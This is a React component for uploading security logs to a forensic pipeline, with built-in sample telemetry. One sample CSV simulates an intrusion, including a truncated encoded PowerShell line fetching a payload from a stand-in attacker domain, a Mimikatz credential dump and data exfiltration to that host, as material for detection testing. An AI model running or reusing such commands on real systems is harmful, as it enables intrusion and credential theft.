import React, { useState, useRef } from 'react';
import { Upload, FileText, CheckCircle2, AlertCircle, Sparkles, HardDrive, ShieldCheck, X } from 'lucide-react';
import Spinner from './Spinner';
import { logsApi } from '../services/api';

const MAX_FILE_SIZE_BYTES = 25 * 1024 * 1024; // 25 MB
const ALLOWED_EXTENSIONS = ['.csv', '.json', '.txt', '.log'];

export default function LogUploader({ onUploadSuccess }) {
  const [isDragging, setIsDragging] = useState(false);
  const [file, setFile] = useState(null);
  const [saveLogFile, setSaveLogFile] = useState(true);
  const [isUploading, setIsUploading] = useState(false);
  const [uploadProgress, setUploadProgress] = useState(0);
  const [statusMessage, setStatusMessage] = useState('');
  const [error, setError] = useState(null);
  const [summary, setSummary] = useState(null);
  const fileInputRef = useRef(null);

  const validateFile = (selectedFile) => {
    if (!selectedFile) return 'No file selected';

    if (selectedFile.size === 0) {
      return 'Upload failed: File is empty (0 bytes)';
    }

    if (selectedFile.size > MAX_FILE_SIZE_BYTES) {
      return 'Upload failed: File exceeds 25 MB';
    }

    const name = selectedFile.name || '';
    const ext = name.slice(name.lastIndexOf('.')).toLowerCase();
    if (!ALLOWED_EXTENSIONS.includes(ext)) {
      return 'Upload failed: Unsupported file format. Please upload a .csv, .json, .txt, or .log file.';
    }

    return null;
  };

  const handleDragOver = (e) => {
    e.preventDefault();
    setIsDragging(true);
  };

  const handleDragLeave = () => {
    setIsDragging(false);
  };

  const handleDrop = (e) => {
    e.preventDefault();
    setIsDragging(false);
    if (e.dataTransfer.files && e.dataTransfer.files.length > 0) {
      const droppedFile = e.dataTransfer.files[0];
      const validationError = validateFile(droppedFile);
      if (validationError) {
        setError(validationError);
        setFile(null);
      } else {
        setFile(droppedFile);
        setError(null);
        setSummary(null);
      }
    }
  };

  const handleFileSelect = (e) => {
    if (e.target.files && e.target.files.length > 0) {
      const selectedFile = e.target.files[0];
      const validationError = validateFile(selectedFile);
      if (validationError) {
        setError(validationError);
        setFile(null);
      } else {
        setFile(selectedFile);
        setError(null);
        setSummary(null);
      }
    }
  };

  const handleClearFile = () => {
    setFile(null);
    setError(null);
    if (fileInputRef.current) fileInputRef.current.value = '';
  };

  const handleUpload = async () => {
    if (!file || isUploading) return;

    const validationError = validateFile(file);
    if (validationError) {
      setError(validationError);
      return;
    }

    setIsUploading(true);
    setUploadProgress(0);
    setStatusMessage('Uploading log file to forensic pipeline...');
    setError(null);
    setSummary(null);

    const formData = new FormData();
    formData.append('file', file);
    formData.append('saveFile', saveLogFile ? 'true' : 'false');

    try {
      const res = await logsApi.upload(formData, (progressEvent) => {
        if (progressEvent.total) {
          const percent = Math.round((progressEvent.loaded * 100) / progressEvent.total);
          setUploadProgress(percent);
          if (percent >= 100) {
            setStatusMessage('Parsing & normalizing security telemetry...');
          }
        }
      });

      setSummary(res.data.summary);
      setFile(null);
      if (fileInputRef.current) fileInputRef.current.value = '';
      if (onUploadSuccess) onUploadSuccess(res.data.summary);
    } catch (err) {
      if (!err.response) {
        setError('Upload failed: Backend server unavailable');
      } else if (err.response.status === 413) {
        setError('Upload failed: File exceeds 25 MB');
      } else if (err.response.data?.message) {
        setError(err.response.data.message);
      } else if (err.message) {
        setError(`Upload failed: ${err.message}`);
      } else {
        setError('Failed to parse and ingest log file');
      }
    } finally {
      setIsUploading(false);
      setUploadProgress(0);
      setStatusMessage('');
    }
  };

  const handleLoadSample = async (sampleType) => {
    if (isUploading) return;

    setIsUploading(true);
    setUploadProgress(50);
    setStatusMessage('Ingesting preset forensic telemetry sample...');
    setError(null);
    setSummary(null);

    let sampleContent = '';
    let fileName = '';

    if (sampleType === 'syslog') {
      fileName = 'sshd_auth.log';
      sampleContent = `Sep 17 12:01:02 bastion sshd[4102]: Failed password for invalid user admin from 194.26.29.112 port 49120 ssh2
Sep 17 12:01:08 bastion sshd[4105]: Failed password for invalid user admin from 194.26.29.112 port 49122 ssh2
Sep 17 12:01:14 bastion sshd[4108]: Failed password for invalid user admin from 194.26.29.112 port 49124 ssh2
Sep 17 12:01:21 bastion sshd[4110]: Failed password for invalid user root from 194.26.29.112 port 49126 ssh2
Sep 17 12:01:29 bastion sshd[4114]: Failed password for invalid user root from 194.26.29.112 port 49128 ssh2
Sep 17 12:01:45 bastion sshd[4120]: Accepted password for jsmith from 194.26.29.112 port 49130 ssh2`;
    } else {
      fileName = 'windows_intrusion.csv';
      sampleContent = `timestamp,source,host,username,sourceIP,destinationIP,sourcePort,destinationPort,eventType,action,status,severity,techniqueId,description
2026-09-17T06:00:00Z,windows,WS01-FIN,admin,194.26.29.112,10.0.0.45,51001,445,authentication,login,failed,high,T1110,EventID 4625: Logon failure for user admin from 194.26.29.112
2026-09-17T06:00:15Z,windows,WS01-FIN,admin,194.26.29.112,10.0.0.45,51002,445,authentication,login,failed,high,T1110,EventID 4625: Logon failure for user admin from 194.26.29.112
2026-09-17T06:00:30Z,windows,WS01-FIN,admin,194.26.29.112,10.0.0.45,51003,445,authentication,login,failed,high,T1110,EventID 4625: Logon failure for user admin from 194.26.29.112
2026-09-17T06:00:45Z,windows,WS01-FIN,admin,194.26.29.112,10.0.0.45,51004,445,authentication,login,failed,high,T1110,EventID 4625: Logon failure for user admin from 194.26.29.112
2026-09-17T06:01:00Z,windows,WS01-FIN,jsmith,194.26.29.112,10.0.0.45,51005,445,authentication,login,success,critical,T1078,EventID 4624: Successful logon for jsmith from 194.26.29.112
2026-09-17T06:02:10Z,edr,WS01-FIN,jsmith,10.0.0.45,185.220.101.5,52010,443,process,execute,success,critical,T1059.001,powershell.exe -Enc JABj... -Uri http://evil-c2-tunnel.ru/stage2.bin
2026-09-17T06:05:00Z,edr,WS01-FIN,SYSTEM,10.0.0.45,,0,0,process,execute,success,critical,T1003,Mimikatz LSASS credential dump (Hash: 275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f)
2026-09-17T06:10:00Z,windows,DC01-ROOT,svc_backup,10.0.0.45,10.0.0.1,58921,3389,network,connect,success,critical,T1021.001,Remote Desktop session established from WS01-FIN to DC01-ROOT
2026-09-17T06:15:00Z,network,DC01-ROOT,svc_backup,10.0.0.1,185.220.101.5,61200,443,network,connect,success,critical,T1041,Outbound data burst to evil-c2-tunnel.ru (185.220.101.5)`;
    }

    try {
      const blob = new Blob([sampleContent], { type: 'text/plain' });
      const sampleFile = new File([blob], fileName, { type: 'text/plain' });
      const formData = new FormData();
      formData.append('file', sampleFile);
      formData.append('saveFile', saveLogFile ? 'true' : 'false');

      const res = await logsApi.upload(formData);
      setSummary(res.data.summary);
      if (onUploadSuccess) onUploadSuccess(res.data.summary);
    } catch (err) {
      if (!err.response) {
        setError('Upload failed: Backend server unavailable');
      } else {
        setError(err.response?.data?.message || 'Failed to ingest sample telemetry');
      }
    } finally {
      setIsUploading(false);
      setUploadProgress(0);
      setStatusMessage('');
    }
  };

  const formatFileSize = (bytes) => {
    if (!bytes) return '0 B';
    if (bytes >= 1024 * 1024) return `${(bytes / (1024 * 1024)).toFixed(2)} MB`;
    return `${(bytes / 1024).toFixed(1)} KB`;
  };

  return (
    <div className="space-y-6">
      {/* Drag & Drop Card */}
      <div
        onDragOver={handleDragOver}
        onDragLeave={handleDragLeave}
        onDrop={handleDrop}
        className={`p-8 border-2 border-dashed rounded-2xl text-center transition-all ${
          isDragging
            ? 'border-cyan-400 bg-cyan-500/10'
            : 'border-slate-800 bg-[#0f1422] hover:border-slate-700'
        }`}
      >
        <input
          ref={fileInputRef}
          type="file"
          accept=".csv,.json,.txt,.log"
          onChange={handleFileSelect}
          className="hidden"
          disabled={isUploading}
        />

        <div className="mx-auto w-14 h-14 rounded-2xl bg-cyan-500/10 text-cyan-400 flex items-center justify-center mb-4">
          <Upload className="w-7 h-7" />
        </div>

        <h4 className="text-base font-bold font-mono text-slate-100">
          Upload & Ingest Security Log File
        </h4>
        <p className="text-xs text-slate-400 mt-1 max-w-md mx-auto">
          Supported formats: <strong className="text-slate-300">.CSV, .JSON, .TXT, .LOG</strong> (Windows Event Logs, Linux Syslog, EDR, Firewall dumps up to 25MB).
        </p>

        {/* Selected File Badge */}
        {file && (
          <div className="mt-4 inline-flex items-center gap-3 px-3.5 py-2 rounded-xl bg-[#080b12] border border-cyan-500/40 text-xs font-mono text-cyan-300 shadow-[0_0_12px_rgba(6,182,212,0.15)]">
            <FileText className="w-4 h-4 text-cyan-400" />
            <span className="font-semibold">{file.name}</span>
            <span className="text-slate-400">({formatFileSize(file.size)})</span>
            {!isUploading && (
              <button
                type="button"
                onClick={handleClearFile}
                className="text-slate-500 hover:text-rose-400 transition-colors ml-1"
                title="Remove file"
              >
                <X className="w-4 h-4" />
              </button>
            )}
          </div>
        )}

        {/* Upload Progress Bar */}
        {isUploading && (
          <div className="mt-5 max-w-md mx-auto space-y-2">
            <div className="flex items-center justify-between text-xs font-mono text-slate-400">
              <span>{statusMessage || 'Processing...'}</span>
              <span>{uploadProgress > 0 ? `${uploadProgress}%` : ''}</span>
            </div>
            <div className="w-full h-1.5 bg-slate-800 rounded-full overflow-hidden">
              <div
                className="h-full bg-gradient-to-r from-cyan-500 to-blue-500 transition-all duration-300"
                style={{ width: `${uploadProgress > 0 ? uploadProgress : 100}%` }}
              />
            </div>
          </div>
        )}

        {/* Action Buttons */}
        <div className="mt-6 flex items-center justify-center gap-3">
          <button
            type="button"
            onClick={() => fileInputRef.current?.click()}
            disabled={isUploading}
            className="px-4 py-2 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-mono font-medium transition-colors disabled:opacity-50"
          >
            {file ? 'Change File...' : 'Browse Files...'}
          </button>

          {file && (
            <button
              type="button"
              onClick={handleUpload}
              disabled={isUploading}
              className="flex items-center gap-2 px-5 py-2 rounded-lg bg-gradient-to-r from-cyan-500 to-blue-600 text-black text-xs font-bold font-mono hover:brightness-110 shadow-[0_0_12px_rgba(6,182,212,0.3)] disabled:opacity-50 transition-all cursor-pointer"
            >
              {isUploading ? <Spinner size="sm" /> : <Upload className="w-4 h-4" />}
              {isUploading ? 'Ingesting Telemetry...' : 'Upload & Ingest'}
            </button>
          )}
        </div>
      </div>

      {/* Preset Quick Ingestion Samples */}
      <div className="p-4 bg-[#0b0f19] border border-slate-800/80 rounded-xl flex flex-wrap items-center justify-between gap-3">
        <div className="flex items-center gap-2">
          <Sparkles className="w-4 h-4 text-cyan-400" />
          <span className="text-xs font-mono font-semibold text-slate-300">
            One-Click Sample Telemetry Feeds:
          </span>
        </div>

        <div className="flex items-center gap-2">
          <button
            type="button"
            disabled={isUploading}
            onClick={() => handleLoadSample('intrusion')}
            className="px-3 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-cyan-300 text-xs font-mono transition-colors disabled:opacity-50"
          >
            + Load Multi-Stage APT Sample (CSV)
          </button>
          <button
            type="button"
            disabled={isUploading}
            onClick={() => handleLoadSample('syslog')}
            className="px-3 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-amber-300 text-xs font-mono transition-colors disabled:opacity-50"
          >
            + Load SSH Brute-Force Sample (TXT)
          </button>
        </div>
      </div>

      {/* Error Message */}
      {error && (
        <div className="p-4 rounded-xl bg-rose-950/60 border border-rose-800 text-rose-300 flex items-center gap-3 text-sm font-mono">
          <AlertCircle className="w-5 h-5 flex-shrink-0 text-rose-400" />
          <span>{error}</span>
        </div>
      )}

      {/* Ingestion Parse Summary Card */}
      {summary && (
        <div className="p-5 rounded-xl bg-[#0f1422] border border-emerald-500/40 shadow-[0_0_15px_rgba(16,185,129,0.15)] space-y-4">
          <div className="flex items-center justify-between flex-wrap gap-2">
            <div className="flex items-center gap-2 text-emerald-400 font-mono font-bold text-sm">
              <CheckCircle2 className="w-5 h-5" />
              <span>Telemetry Ingestion & Normalization Completed!</span>
            </div>
            <div className="flex items-center gap-1.5 text-xs font-mono text-emerald-400 bg-emerald-950/60 border border-emerald-800 px-2.5 py-1 rounded-md">
              <ShieldCheck className="w-3.5 h-3.5" />
              <span>Integrity Verified</span>
            </div>
          </div>

          <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 text-xs font-mono">
            <div className="p-3 bg-[#0a0d14] rounded-lg border border-slate-800">
              <span className="text-slate-500 uppercase block mb-1">File Ingested</span>
              <strong className="text-slate-200 truncate block" title={summary.fileName}>
                {summary.fileName}
              </strong>
              {summary.fileSize && (
                <span className="text-[11px] text-slate-500 block mt-0.5">
                  {formatFileSize(summary.fileSize)}
                </span>
              )}
            </div>

            <div className="p-3 bg-[#0a0d14] rounded-lg border border-slate-800">
              <span className="text-slate-500 uppercase block mb-1">Normalized Events</span>
              <strong className="text-cyan-400 text-base">
                {summary.eventsInserted?.toLocaleString() || 0}
              </strong>
              {summary.recordsProcessed && (
                <span className="text-[11px] text-slate-500 block mt-0.5">
                  {summary.recordsProcessed.toLocaleString()} parsed
                </span>
              )}
            </div>

            <div className="p-3 bg-[#0a0d14] rounded-lg border border-slate-800">
              <span className="text-slate-500 uppercase block mb-1">Extracted IOCs</span>
              <strong className="text-purple-400 text-base">
                {summary.iocsExtracted?.toLocaleString() || 0}
              </strong>
              <span className="text-[11px] text-slate-500 block mt-0.5">IPs, Domains, Hashes</span>
            </div>

            <div className="p-3 bg-[#0a0d14] rounded-lg border border-slate-800">
              <span className="text-slate-500 uppercase block mb-1">Generated Alerts</span>
              <strong className="text-rose-400 text-base">
                {summary.alertsGenerated?.toLocaleString() || 0}
              </strong>
              <span className="text-[11px] text-slate-500 block mt-0.5">MITRE Mapped</span>
            </div>
          </div>

          {summary.rejectedRecords > 0 && (
            <div className="p-2.5 rounded-lg bg-amber-950/40 border border-amber-800/60 text-amber-300 text-xs font-mono">
              Notice: {summary.rejectedRecords} records could not be inserted due to database schema constraints.
            </div>
          )}
        </div>
      )}
    </div>
  );
}
